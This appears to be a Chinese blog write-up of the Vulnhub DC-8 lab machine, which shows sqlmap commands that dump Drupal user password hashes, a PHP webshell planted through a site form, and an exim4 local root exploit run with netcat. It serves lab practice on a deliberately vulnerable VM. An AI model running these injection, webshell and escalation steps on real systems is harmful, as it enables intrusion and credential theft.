---
layout: mypost
title: Vulnhub靶机DC8渗透
categories: [靶机]
---

靶机下载地址：[DC8](https://www.vulnhub.com/entry/dc-8,367/)

Kali Linux 地址：192.168.43.110

![](https://z3.ax1x.com/2021/04/28/gi2uu9.png)

DC8 地址：192.168.43.147

访问 web 页面

![](https://z3.ax1x.com/2021/04/28/gi2MH1.png)

又见 drupal

![](https://z3.ax1x.com/2021/04/28/gi2qKJ.png)

dirb 扫目录

![](https://z3.ax1x.com/2021/04/28/gihow9.png)

/admin 被 ban

![](https://z3.ax1x.com/2021/04/28/gi4CFI.png)

/robots.txt 可以访问

![](https://z3.ax1x.com/2021/04/28/gi4t0J.png)

/user 后台确认

![](https://z3.ax1x.com/2021/04/28/gi4N79.png)

跟随作者提示，不爆破

![](https://z3.ax1x.com/2021/04/28/gi5GCt.png)

Details 下三个页面似乎存在 sql 注入

![](https://z3.ax1x.com/2021/04/28/gioCk9.png)

手测

![](https://z3.ax1x.com/2021/04/28/gi7bYd.png)

确认，放 sqlmap 去跑

爆库

```bash
sqlmap -u http://192.168.43.147/?nid=1%27 --dbs
```

![](https://z3.ax1x.com/2021/04/28/gi7zm8.png)

爆表

```bash
sqlmap -u http://192.168.43.147/?nid=1%27 -D d7db --tables
```

![](https://z3.ax1x.com/2021/04/28/giHPYj.png)

爆字段

```bash
sqlmap -u http://192.168.43.147/?nid=1%27 -D d7db -T users --columns
```

![](https://z3.ax1x.com/2021/04/28/giHKk4.png)

爆值

```bash
sqlmap -u http://192.168.43.147/?nid=1%27 -D d7db -T users -C "name,pass" --dump
```

![](https://z3.ax1x.com/2021/04/28/giH86x.png)

```hash
admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
```

john 爆 hash

![](https://z3.ax1x.com/2021/04/28/giHLEF.png)

只得到 john 的密码 turtle

![](https://z3.ax1x.com/2021/04/28/giHX4J.png)

发现这里有机会反弹 shell

![](https://z3.ax1x.com/2021/04/28/giq0yt.png)

传个一句话🐎，保存配置

> 自带的格式不要删除，否者会后端读取的时候会报错导致无法执行 php 代码

随便写点提交

![](https://z3.ax1x.com/2021/04/28/giqzm6.png)

![](https://z3.ax1x.com/2021/04/28/giLpTO.png)

成功上线，用 python 获取标准交互 shell

发现 find 可用

![](https://z3.ax1x.com/2021/04/28/giLn78.png)

exim4 可疑，查看版本

![](https://z3.ax1x.com/2021/04/28/giL8cn.png)

![](https://z3.ax1x.com/2021/04/28/giLD39.png)

经测试 46996.sh 可用

![](https://z3.ax1x.com/2021/04/28/giLgHK.png)

靶机下载直接用有 unix 兼容问题，改了还报错

直接单纯把代码部分提取出来测试

```bash
chmod 777 root.sh
./root.sh
```

![](https://z3.ax1x.com/2021/04/29/giXzmq.png)

可行

```bash
./root.sh -m netcat
```

同样在  /root 下

![](https://z3.ax1x.com/2021/04/29/gijS00.png)

Pwned！